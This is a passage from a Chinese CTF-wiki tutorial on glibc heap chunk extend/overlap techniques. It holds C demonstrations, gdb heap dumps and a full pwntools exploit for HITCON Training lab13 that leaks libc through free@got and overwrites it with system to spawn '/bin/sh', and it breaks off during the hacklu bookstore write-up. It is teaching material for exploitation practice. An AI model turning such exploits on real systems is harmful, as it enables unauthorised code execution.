<h5 id="在这个例子中，因为分配的-size-不处于-fastbin-的范围，因此在释放时如果与-top-chunk-相连会导致和-top-chunk-合并。所以我们需要额外分配一个-chunk，把释放的块与-top-chunk-隔开。"><a href="#在这个例子中，因为分配的-size-不处于-fastbin-的范围，因此在释放时如果与-top-chunk-相连会导致和-top-chunk-合并。所以我们需要额外分配一个-chunk，把释放的块与-top-chunk-隔开。" class="headerlink" title="在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。"></a>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x00000000000000b1</span> &lt;===chunk1 篡改size域</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== chunk2</span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== 防止合并的chunk</span><br><span class="line"><span class="number">0x6020c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020d0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f31</span> &lt;=== top chunk</span><br></pre></td></tr></table></figure>

<p>释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x00000000000000b1</span> &lt;=== 被放入unsorted <span class="built_in">bin</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x00007ffff7dd1b78</span>  <span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x00000000000000b0</span>  <span class="number">0x0000000000000020</span> &lt;=== 注意此处标记为空</span><br><span class="line"><span class="number">0x6020c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020d0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f31</span> &lt;=== top chunk</span><br><span class="line">[+] unsorted_bins[<span class="number">0</span>]: fw=<span class="number">0x602000</span>, bk=<span class="number">0x602000</span></span><br><span class="line"> →   Chunk(addr=<span class="number">0x602010</span>, size=<span class="number">0xb0</span>, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure>

<p>再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">0x4005b0</span> &lt;main+<span class="number">74</span>&gt;        call   <span class="number">0x400450</span> &lt;malloc@plt&gt;</span><br><span class="line">→   <span class="number">0x4005b5</span> &lt;main+<span class="number">79</span>&gt;        mov    QWORD PTR [rbp-<span class="number">0x8</span>], rax</span><br><span class="line"></span><br><span class="line">    rax : <span class="number">0x0000000000602010</span></span><br></pre></td></tr></table></figure>



<h2 id="基本示例-3：对-free-的-smallbin-进行-extend"><a href="#基本示例-3：对-free-的-smallbin-进行-extend" class="headerlink" title="基本示例 3：对 free 的 smallbin 进行 extend"></a>基本示例 3：对 free 的 smallbin 进行 extend</h2><p>示例 3 是在示例 2 的基础上进行的，这次我们先释放 chunk1，然后再修改处于 unsorted bin 中的 chunk1 的 size 域。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=malloc(<span class="number">0x80</span>);//分配第一个<span class="number">0x80</span>的chunk1</span><br><span class="line">    malloc(<span class="number">0x10</span>);//分配第二个<span class="number">0x10</span>的chunk2</span><br><span class="line"></span><br><span class="line">    free(ptr);//首先进行释放，使得chunk1进入unsorted <span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line">    *(<span class="built_in">int</span> *)((<span class="built_in">int</span>)ptr-<span class="number">0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    ptr1=malloc(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两次 malloc 之后的结果如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span> &lt;=== chunk <span class="number">1</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== chunk <span class="number">2</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f51</span></span><br></pre></td></tr></table></figure>

<p>我们首先释放 chunk1 使它进入 unsorted bin 中</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">     unsorted_bins[<span class="number">0</span>]: fw=<span class="number">0x602000</span>, bk=<span class="number">0x602000</span></span><br><span class="line"> →   Chunk(addr=<span class="number">0x602010</span>, size=<span class="number">0x90</span>, flags=PREV_INUSE)</span><br><span class="line"></span><br><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span> &lt;=== 进入unsorted <span class="built_in">bin</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x00007ffff7dd1b78</span>  <span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000090</span>  <span class="number">0x0000000000000020</span> &lt;=== chunk <span class="number">2</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f51</span> &lt;=== top chunk</span><br></pre></td></tr></table></figure>

<p>然后篡改 chunk1 的 size 域</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x00000000000000b1</span> &lt;=== size域被篡改</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x00007ffff7dd1b78</span>  <span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000090</span>  <span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f51</span></span><br></pre></td></tr></table></figure>

<p>此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。</p>
<h2 id="Chunk-Extend-Shrink-可以做什么"><a href="#Chunk-Extend-Shrink-可以做什么" class="headerlink" title="Chunk Extend&#x2F;Shrink 可以做什么"></a>Chunk Extend&#x2F;Shrink 可以做什么</h2><p>一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。</p>
<p>此外通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd&#x2F;bk 指针从而可以实现 fastbin attack 等利用。</p>
<h2 id="基本示例-4：通过-extend-后向-overlapping"><a href="#基本示例-4：通过-extend-后向-overlapping" class="headerlink" title="基本示例 4：通过 extend 后向 overlapping"></a>基本示例 4：通过 extend 后向 overlapping</h2><p>这里展示通过 extend 进行后向 overlapping，这也是在 CTF 中最常出现的情况，通过 overlapping 可以实现其它的一些利用。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=malloc(<span class="number">0x10</span>);//分配第<span class="number">1</span>个 <span class="number">0x80</span> 的chunk1</span><br><span class="line">    malloc(<span class="number">0x10</span>); //分配第<span class="number">2</span>个 <span class="number">0x10</span> 的chunk2</span><br><span class="line">    malloc(<span class="number">0x10</span>); //分配第<span class="number">3</span>个 <span class="number">0x10</span> 的chunk3</span><br><span class="line">    malloc(<span class="number">0x10</span>); //分配第<span class="number">4</span>个 <span class="number">0x10</span> 的chunk4    </span><br><span class="line">    *(<span class="built_in">int</span> *)((<span class="built_in">int</span>)ptr-<span class="number">0x8</span>)=<span class="number">0x61</span>;</span><br><span class="line">    free(ptr);</span><br><span class="line">    ptr1=malloc(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p>
<h2 id="基本示例-5：通过-extend-前向-overlapping"><a href="#基本示例-5：通过-extend-前向-overlapping" class="headerlink" title="基本示例 5：通过 extend 前向 overlapping"></a>基本示例 5：通过 extend 前向 overlapping</h2><p>这里展示通过修改 pre_inuse 域和 pre_size 域实现合并前面的块</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=malloc(<span class="number">128</span>);//smallbin1</span><br><span class="line">    ptr2=malloc(<span class="number">0x10</span>);//fastbin1</span><br><span class="line">    ptr3=malloc(<span class="number">0x10</span>);//fastbin2</span><br><span class="line">    ptr4=malloc(<span class="number">128</span>);//smallbin2</span><br><span class="line">    malloc(<span class="number">0x10</span>);//防止与top合并</span><br><span class="line">    free(ptr1);</span><br><span class="line">    *(<span class="built_in">int</span> *)((long long)ptr4-<span class="number">0x8</span>)=<span class="number">0x90</span>;//修改pre_inuse域</span><br><span class="line">    *(<span class="built_in">int</span> *)((long long)ptr4-<span class="number">0x10</span>)=<span class="number">0xd0</span>;//修改pre_size域</span><br><span class="line">    free(ptr4);//unlink进行前向extend</span><br><span class="line">    malloc(<span class="number">0x150</span>);//占位块</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p>
<h2 id="HITCON-Training-lab13"><a href="#HITCON-Training-lab13" class="headerlink" title="HITCON Training lab13"></a>HITCON Training lab13</h2><p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13">题目链接</a></p>
<h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  hitcontraning_lab13 git:(master) file heapcreator</span><br><span class="line">heapcreator: ELF <span class="number">64</span>-bit LSB executable, x86-<span class="number">64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-<span class="number">64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=5e69111eca74cba2fb372dfcd3a59f93ca58f858, <span class="keyword">not</span> stripped</span><br><span class="line">➜  hitcontraning_lab13 git:(master) checksec heapcreator</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/hitcontraning_lab13/heapcreator&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>

<p>程序为 64 位动态链接程序，主要开启了 Canary 保护与 NX 保护。</p>
<h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>程序大概是一个自定义的堆分配器，每个堆主要有两个成员：大小与内容指针。主要功能如下</p>
<ol>
<li>创建堆，根据用户输入的长度，申请对应内存空间，并利用 read 读取指定长度内容。这里长度没有进行检测，当长度为负数时，会出现任意长度堆溢出的漏洞。当然，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。</li>
<li>编辑堆，根据指定的索引以及之前存储的堆的大小读取指定内容，但是这里读入的长度会比之前大 1，所以会<strong>存在 off by one 的漏洞</strong>。</li>
<li>展示堆，输出指定索引堆的大小以及内容。</li>
<li>删除堆，删除指定堆，并且将对应指针设置为了 NULL。</li>
</ol>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>基本利用思路如下</p>
<ol>
<li>利用 off by one 漏洞覆盖下一个 chunk 的 size 字段，从而构造伪造的 chunk 大小。</li>
<li>申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</li>
</ol>
<p>更加具体的还是直接看脚本吧。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">heap = ELF(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">&quot;dada&quot;</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">&quot;ddaa&quot;</span>)  <span class="comment"># 1</span></span><br><span class="line"><span class="comment"># overwrite heap 1&#x27;s struct&#x27;s size to 0x41</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">&quot;\x41&quot;</span>)</span><br><span class="line"><span class="comment"># trigger heap 1&#x27;s struct to fastbin 0x40</span></span><br><span class="line"><span class="comment"># heap 1&#x27;s content to fastbin 0x20</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># new heap 1&#x27;s struct will point to old heap 1&#x27;s content, size 0x20</span></span><br><span class="line"><span class="comment"># new heap 1&#x27;s content will point to old heap 1&#x27;s struct, size 0x30</span></span><br><span class="line"><span class="comment"># that is to say we can overwrite new heap 1&#x27;s struct</span></span><br><span class="line"><span class="comment"># here we overwrite its heap content pointer to free@got</span></span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">&#x27;free&#x27;</span>]))  <span class="comment">#1</span></span><br><span class="line"><span class="comment"># leak freeaddr</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">&quot;Done !&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base addr: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment"># overwrite free@got with system addr</span></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line"><span class="comment"># trigger system(&quot;/bin/sh&quot;)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h2><p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore">题目链接</a></p>
<h3 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  2015_hacklu_bookstore git:(master) file books    </span><br><span class="line">books: ELF <span class="number">64</span>-bit LSB executable, x86-<span class="number">64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-<span class="number">64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=3a15f5a8e83e55c535d220473fa76c314d26b124, stripped</span><br><span class="line">➜  2015_hacklu_bookstore git:(master) checksec books    </span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/2015_hacklu_bookstore/books&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>

<p>可以看出该程序是动态链接的 64 位程序，主要开启了 Canary 与 NX 保护。</p>
<h3 id="基本功能-1"><a href="#基本功能-1" class="headerlink" title="基本功能"></a>基本功能</h3><p>该程序的主要功能是订书，具体如下</p>
<ul>
<li>最多可以订购两本书。</li>
<li>根据编号来选择订购第几本书，可以为每本书添加对应的名字。然而在添加名字处出现了任意长度堆溢出的漏洞。</li>
